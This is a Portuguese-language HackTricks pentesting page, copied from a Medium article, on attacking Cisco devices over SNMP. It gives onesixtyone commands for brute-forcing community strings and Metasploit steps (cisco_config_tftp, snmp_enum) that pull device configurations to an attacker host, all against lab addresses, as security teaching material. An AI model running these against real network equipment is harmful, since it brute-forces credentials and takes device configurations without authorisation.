# Cisco SNMP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Esta pÃ¡gina foi copiada de [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

## ExfiltraÃ§Ã£o de configuraÃ§Ã£o e enumeraÃ§Ã£o via SNMP <a href="#e21c" id="e21c"></a>

**SNMP (Simple Network Management Protocol)** Ã© um protocolo que permite monitorar o status de dispositivos em uma rede de computadores. Pode ser equipamento de rede, telefones IP, servidores corporativos ou qualquer outra coisa.

**SNMP usa o protocolo de camada de transporte UDP com nÃºmeros de porta 161/UDP e 162/UDP.** As chamadas strings de comunidade sÃ£o usadas para se referir a agentes SNMP para o servidor. Estas sÃ£o, digamos, senhas especiais para se comunicar com o servidor SNMP. **As strings de comunidade tÃªm permissÃµes de apenas leitura (RO) ou leitura e gravaÃ§Ã£o (RW).**

**Na verdade, SNMP nÃ£o sÃ³ pode monitorar o status do equipamento, mas tambÃ©m gerenciÃ¡-lo completamente: despejar configuraÃ§Ãµes, alterar a configuraÃ§Ã£o, etc.** Se um pentester pode procurar o valor das strings de comunidade, ele realmente ganha acesso ao equipamento. **No entanto, tudo depende de qual string ele bruteforceou - para a string de comunidade RO ou RW.**

**A forÃ§a bruta das strings de comunidade pode ser implementada usando a** [**onesixtyone**](https://github.com/trailofbits/onesixtyone) **utilidade.** Ele receberÃ¡ como entrada o dicionÃ¡rio para forÃ§a bruta e os endereÃ§os IP dos hosts de destino. Os alvos serÃ£o:

* **10.10.100.10 - Switch Cisco vIOS**
* **10.10.100.254 - Roteador Cisco vIOS**
```
~$ onesixtyone -c communitystrings -i targets
```
Descobrimos quais sÃ£o as strings de comunidade usadas nesses dispositivos. Isso abre caminho para a exploraÃ§Ã£o.

### 8.1 cisco\_config\_tftp <a href="#1dbf" id="1dbf"></a>

Com o framework Metasploit, nomeadamente o mÃ³dulo **cisco\_config\_tftp**, Ã© possÃ­vel obter a configuraÃ§Ã£o do dispositivo, conhecendo o valor da string de comunidade. A string que tem direitos de leitura e escrita Ã© **private**.

SerÃ¡ necessÃ¡rio o seguinte:

* **String de comunidade de leitura e escrita (COMMUNITY)**
* **EndereÃ§o IP do atacante (LHOST)**
* **EndereÃ§o IP do equipamento alvo (RHOSTS)**
* **O caminho no qual o mÃ³dulo produz a configuraÃ§Ã£o do dispositivo (OUTPUTDIR)**
```bash
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set COMMUNITY private
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set RHOSTS 10.10.100.10
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set LHOST 10.10.100.50
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set OUTPUTDIR /home/necreas1ng/snmp
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > exploit
```
Depois de iniciar o mÃ³dulo, a configuraÃ§Ã£o do host com o endereÃ§o 10.10.100.10 (10.10.100.10.txt) serÃ¡ baixada na pasta especificada.

![](<../../.gitbook/assets/image (223).png>)

### 8.2 snmp\_enum <a href="#3429" id="3429"></a>

Com este mÃ³dulo, vocÃª pode descobrir informaÃ§Ãµes sobre o hardware do alvo. Tudo Ã© exatamente o mesmo: especifique a **COMMUNITY** (aliÃ¡s, atÃ© mesmo uma string com permissÃµes **RO** servirÃ¡) e o endereÃ§o IP do dispositivo de destino.
```bash
msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 10.10.100.10
msf6 auxiliary(scanner/snmp/snmp_enum) > exploit
```
<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
